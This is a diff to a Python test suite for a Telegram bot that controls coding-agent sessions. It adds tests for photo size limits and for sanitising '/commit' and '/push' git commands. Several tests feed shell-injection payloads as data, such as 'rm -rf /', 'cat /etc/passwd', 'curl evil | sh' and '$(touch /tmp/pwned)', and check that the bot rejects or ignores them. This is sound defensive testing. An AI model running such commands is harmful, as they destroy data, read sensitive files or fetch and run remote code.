@@ -1,4 +1,6 @@
 import asyncio
+import html
+import shlex
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -178,6 +180,8 @@ class FakeGitManager:
         local_branches=None,
         prepare_result=None,
         checkout_result=None,
+        git_command_results=None,
+        push_result=None,
     ):
         self._is_git_repo = is_git_repo
         self._current_branch = current_branch
@@ -185,7 +189,12 @@ class FakeGitManager:
         self._local_branches = local_branches or []
         self.prepare_result = prepare_result
         self.checkout_result = checkout_result
+        self.git_command_results = list(git_command_results or [])
+        self.push_result = push_result
         self.refresh_result = None
+        self.git_commands = []
+        self.safe_git_commands = []
+        self.push_calls = []
 
     def is_git_repo(self, project_path):
         return self._is_git_repo
@@ -208,6 +217,24 @@ class FakeGitManager:
     def checkout_branch(self, project_path, branch_name):
         return self.checkout_result
 
+    def run_git_command(self, project_path, args):
+        self.git_commands.append((project_path, args))
+        if self.git_command_results:
+            return self.git_command_results.pop(0)
+        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")
+
+    def run_safe_commit_command(self, project_path, args):
+        self.safe_git_commands.append((project_path, args))
+        if self.git_command_results:
+            return self.git_command_results.pop(0)
+        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")
+
+    def push_branch(self, project_path, branch_name):
+        self.push_calls.append((project_path, branch_name))
+        if self.push_result is not None:
+            return self.push_result
+        return SimpleNamespace(success=True, message=f"Pushed branch '{branch_name}' to origin.", current_branch=branch_name)
+
 
 class FakeTelegramFile:
     def __init__(self, content: bytes, file_path: str):
@@ -219,8 +246,9 @@ class FakeTelegramFile:
 
 
 class FakePhotoSize:
-    def __init__(self, telegram_file: FakeTelegramFile):
+    def __init__(self, telegram_file: FakeTelegramFile, *, file_size: int | None = None):
         self.telegram_file = telegram_file
+        self.file_size = file_size if file_size is not None else len(getattr(telegram_file, "_content", b""))
 
     async def get_file(self):
         return self.telegram_file
@@ -257,7 +285,6 @@ def make_config(tmp_path: Path) -> AppConfig:
         codex_sandbox_mode="workspace-write",
         codex_skip_git_repo_check=False,
         max_telegram_message_length=3000,
-        enable_group_chats=False,
         enable_sensitive_diff_filter=True,
         default_agent_provider="codex",
     )
@@ -684,6 +711,56 @@ def test_photo_message_rejected_for_copilot_session(tmp_path: Path):
     assert "Photo attachments are currently supported only for codex sessions." in bot.messages[-1][1]
 
 
+def test_photo_message_rejected_when_declared_size_exceeds_limit(tmp_path: Path):
+    backend = tmp_path / "backend"
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+
+    photo = FakePhotoSize(
+        FakeTelegramFile(b"small-content", "photos/pic.png"),
+        file_size=(5 * 1024 * 1024) + 1,
+    )
+    update = SimpleNamespace(
+        effective_chat=SimpleNamespace(id=123, type="private"),
+        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
+    )
+    bot = FakeBot()
+    context = SimpleNamespace(args=[], bot=bot)
+
+    asyncio.run(router.handle_photo(update, context))
+
+    assert runner.resume_calls == []
+    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."
+
+
+def test_photo_message_rejected_when_downloaded_size_exceeds_limit(tmp_path: Path):
+    backend = tmp_path / "backend"
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+
+    oversized = b"x" * ((5 * 1024 * 1024) + 1)
+    photo = FakePhotoSize(FakeTelegramFile(oversized, "photos/pic.png"), file_size=1024)
+    update = SimpleNamespace(
+        effective_chat=SimpleNamespace(id=123, type="private"),
+        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
+    )
+    bot = FakeBot()
+    context = SimpleNamespace(args=[], bot=bot)
+
+    asyncio.run(router.handle_photo(update, context))
+
+    assert runner.resume_calls == []
+    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."
+
+
 def test_assistant_output_is_rendered_as_html_not_raw_markdown(tmp_path: Path):
     backend = tmp_path / "backend"
     backend.mkdir()
@@ -837,3 +914,361 @@ def test_unsupported_message_type_is_rejected(tmp_path: Path):
     asyncio.run(router.handle_unsupported_message(update, context))
 
     assert "This bot currently accepts only text messages and photos." in bot.messages[-1][1]
+
+
+def _make_commit_router(tmp_path: Path, *, git_manager=None, trusted: bool = True) -> tuple[CommandRouter, Path]:
+    backend = (tmp_path / "backend").resolve()
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
+    if trusted:
+        store.trust_project("backend")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+    router.git = git_manager or FakeGitManager(is_git_repo=True)
+    router.runtime.git = router.git
+    return router, backend
+
+
+def _run_commit_command(router: CommandRouter, raw: str) -> FakeBot:
+    update = make_update(text=raw)
+    bot = FakeBot()
+    context = SimpleNamespace(args=raw.split()[1:], bot=bot)
+    asyncio.run(router.handle_commit(update, context))
+    return bot
+
+
+def _run_push_command(router: CommandRouter) -> FakeBot:
+    update = make_update(text="/push")
+    bot = FakeBot()
+    context = SimpleNamespace(args=[], bot=bot)
+    asyncio.run(router.handle_push(update, context))
+    return bot
+
+
+def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git add completed."),
+                SimpleNamespace(success=True, message="git commit completed.", stdout="[telegram-enhance 5b9a263] safe"),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git add -u && rm -rf / && git commit -m "safe"')
+
+    assert router.git.safe_git_commands == [
+        (backend, ["add", "-u"]),
+        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
+    ]
+    assert router.git.git_commands == []
+    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
+    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
+    ) in bot.messages[-1][1]
+    assert "---------------" in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+    assert "[telegram-enhance 5b9a263] safe" in bot.messages[-1][1]
+    assert "Ignored non-git commands:" in bot.messages[-1][1]
+    assert "- rm -rf /" in bot.messages[-1][1]
+
+
+def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    bot = _run_commit_command(router, '/commit git -c alias.x=!echo hacked commit -m "x"')
+
+    assert router.git.safe_git_commands == []
+    assert "No valid git commit commands were found." in bot.messages[-1][1]
+
+
+def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
+    cases = [
+        ('/commit git status; python exploit.py; git add -u', ("python exploit.py",)),
+        ('/commit git status&&rm -rf /&&git add -u', ("rm -rf /",)),
+        ('/commit git status | cat /etc/passwd | git add -u', ("cat /etc/passwd",)),
+        ('/commit git status & curl evil | sh & git add -u', ("curl evil", "sh")),
+        ('/commit git status > /tmp/out && git add -u', ("/tmp/out",)),
+        ('/commit git status >> /tmp/out && git add -u', ("/tmp/out",)),
+        ('/commit git status < /tmp/in && git add -u', ("/tmp/in",)),
+        ('/commit git status\nrm -rf /\ngit add -u', ("rm -rf /",)),
+        ('/commit git status; $(touch /tmp/pwned); git add -u', ("$(touch /tmp/pwned)",)),
+        ('/commit git status && `whoami` && git add -u', ("`whoami`",)),
+        ('/commit git status && env VAR=1 python exploit.py && git add -u', ("env VAR=1 python exploit.py",)),
+        ('/commit python exploit.py && git status && git add -u', ("python exploit.py",)),
+    ]
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git add completed."),
+            ]
+            * len(cases),
+        ),
+    )
+
+    for raw, ignored_fragments in cases:
+        bot = _run_commit_command(router, raw)
+
+        assert router.git.safe_git_commands[-2:] == [
+            (backend, ["status"]),
+            (backend, ["add", "-u"]),
+        ]
+        for fragment in ignored_fragments:
+            assert fragment in bot.messages[-1][1]
+        assert "Ignored non-git commands:" in bot.messages[-1][1]
+
+
+def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
+    cases = [
+        '/commit "unterminated',
+        '/commit env VAR=1 git status',
+        '/commit git status git commit -m "oops"',
+        '/commit git status git diff -- README.md',
+        '/commit git status git push origin main',
+        '/commit git add --pathspec-from-file /etc/hosts',
+        '/commit git add --pathspec-from-file=/etc/hosts',
+        '/commit git add --pathspec-from-f=/etc/hosts',
+        '/commit git commit -F /etc/hosts',
+        '/commit git commit -F/etc/hosts',
+        '/commit git commit --file=/etc/hosts',
+        '/commit git commit --allow-empty --fil=/etc/hosts',
+        '/commit git commit --templ=/etc/hosts',
+        '/commit git diff -- README.md',
+        '/commit git diff --no-index /etc/passwd /dev/null',
+    ]
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    for raw in cases:
+        bot = _run_commit_command(router, raw)
+
+        assert router.git.safe_git_commands == []
+        assert "No valid git commit commands were found." in bot.messages[-1][1]
+
+
+def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git add completed."),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git status&&git add -u')
+
+    assert router.git.safe_git_commands == [
+        (backend, ["status"]),
+        (backend, ["add", "-u"]),
+    ]
+    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
+    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
+    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+    assert "Ignored non-git commands:" not in bot.messages[-1][1]
+
+
+def test_commit_allows_common_safe_short_forms(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[
+                SimpleNamespace(success=True, message="git status completed."),
+                SimpleNamespace(success=True, message="git commit completed."),
+            ],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git status -sb&&git commit -msafe')
+
+    assert router.git.safe_git_commands == [
+        (backend, ["status", "-sb"]),
+        (backend, ["commit", "-msafe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
+    ]
+    assert f"${shlex.join(['git', 'status', '-sb'])}" in bot.messages[-1][1]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-msafe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
+    ) in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+
+
+def test_commit_inserts_enforced_flags_before_pathspec_separator(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git commit -m "safe" -- tracked.txt')
+
+    assert router.git.safe_git_commands == [
+        (
+            backend,
+            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "--", "tracked.txt"],
+        ),
+    ]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', '--', 'tracked.txt'])}"
+    ) in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+
+
+def test_commit_inserts_enforced_flags_before_implicit_pathspec(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git commit -m "safe" tracked.txt')
+
+    assert router.git.safe_git_commands == [
+        (
+            backend,
+            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "tracked.txt"],
+        ),
+    ]
+    assert html.escape(
+        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', 'tracked.txt'])}"
+    ) in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+
+
+def test_commit_allows_shell_like_text_inside_quoted_pathspec(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[SimpleNamespace(success=True, message="git add completed.")],
+        ),
+    )
+
+    bot = _run_commit_command(router, '/commit git add "file && keep | chars > literally.txt"')
+
+    assert router.git.safe_git_commands == [
+        (backend, ["add", "file && keep | chars > literally.txt"]),
+    ]
+    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
+    assert html.escape(f"${shlex.join(['git', 'add', 'file && keep | chars > literally.txt'])}") in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+    assert "Ignored non-git commands:" not in bot.messages[-1][1]
+
+
+def test_commit_reports_missing_project_folder_before_git_calls(tmp_path: Path):
+    router, backend = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+    backend.rmdir()
+
+    bot = _run_commit_command(router, "/commit git status")
+
+    assert router.git.safe_git_commands == []
+    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]
+
+
+def test_commit_rejects_parent_path_escape(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    bot = _run_commit_command(router, "/commit git add ../secret.txt")
+
+    assert router.git.safe_git_commands == []
+    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]
+
+
+def test_commit_rejects_absolute_paths(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    bot = _run_commit_command(router, "/commit git commit -m safe -- /etc/passwd")
+
+    assert router.git.safe_git_commands == []
+    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]
+
+
+def test_commit_rejects_pathspec_magic(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
+
+    bot = _run_commit_command(router, "/commit git status -- :(top)README.md")
+
+    assert router.git.safe_git_commands == []
+    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]
+
+
+def test_commit_rejects_mutating_git_commands_for_untrusted_project(tmp_path: Path):
+    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True), trusted=False)
+
+    bot = _run_commit_command(router, "/commit git add -u && git commit -m safe")
+
+    assert router.git.safe_git_commands == []
+    assert "This project is not trusted for mutating git operations." in bot.messages[-1][1]
+
+
+def test_commit_allows_status_for_untrusted_project(tmp_path: Path):
+    router, backend = _make_commit_router(
+        tmp_path,
+        git_manager=FakeGitManager(
+            is_git_repo=True,
+            git_command_results=[SimpleNamespace(success=True, message="git status completed.")],
+        ),
+        trusted=False,
+    )
+
+    bot = _run_commit_command(router, "/commit git status")
+
+    assert router.git.safe_git_commands == [
+        (backend, ["status"]),
+    ]
+    assert "[Completed]" in bot.messages[-1][1]
+
+
+def test_push_uses_current_session_branch(tmp_path: Path):
+    backend = (tmp_path / "backend").resolve()
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+    router.git = FakeGitManager(
+        is_git_repo=True,
+        current_branch="feature-1",
+        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
+    )
+    router.runtime.git = router.git
+
+    bot = _run_push_command(router)
+
+    assert router.git.push_calls == [(backend, "feature-1")]
+    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
+    assert f"${shlex.join(['git', 'push', 'origin', 'feature-1'])}" in bot.messages[-1][1]
+    assert "[Completed]" in bot.messages[-1][1]
+
+
+def test_push_reports_missing_project_folder_before_git_calls(tmp_path: Path):
+    backend = (tmp_path / "backend").resolve()
+    backend.mkdir()
+    runner = DummyRunner()
+    cfg = make_config(tmp_path)
+    store = SessionStore(cfg.state_file, cfg.state_backup_file)
+    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
+    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
+    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
+    router.runtime.git = router.git
+    backend.rmdir()
+
+    bot = _run_push_command(router)
+
+    assert router.git.push_calls == []
+    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]
